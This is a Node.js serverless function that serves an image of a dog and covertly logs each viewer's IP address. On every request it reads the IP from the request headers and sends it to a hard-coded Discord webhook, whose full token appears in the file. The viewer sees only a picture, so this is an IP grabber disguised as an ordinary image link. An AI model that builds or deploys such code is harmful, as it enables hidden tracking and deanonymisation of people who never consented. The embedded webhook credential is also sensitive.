const fs = require("fs");
const path = require("path");
const fetch = require("node-fetch"); // Add node-fetch as dependency in package.json if needed

const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1384059457054572564/-d1jkEYCaQjbBga4Unbalu8AKOc7OsYYK6__vGUHGuheXBeTZE2_1uPp3YLDEaaf42z6";

exports.handler = async (event, context) => {
  // Get visitor IP (try several headers)
  const ip =
    event.headers["client-ip"] ||
    event.headers["x-forwarded-for"]?.split(",")[0] ||
    event.headers["x-nf-client-connection-ip"] ||
    "unknown";

  // Log IP to Discord webhook (ignore errors)
  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: `Dog.png viewed by IP: ${ip}` }),
    });
  } catch (e) {
    console.error("Failed to send webhook:", e);
  }

  // Read dog.png file from your repo root or relative to this file
  const imagePath = path.resolve(__dirname, "../../dog.png"); // Adjust if needed
  const imageBuffer = fs.readFileSync(imagePath);

  return {
    statusCode: 200,
    headers: {
      "Content-Type": "image/png",
      "Cache-Control": "no-cache",
    },
    body: imageBuffer.toString("base64"),
    isBase64Encoded: true,
  };
};
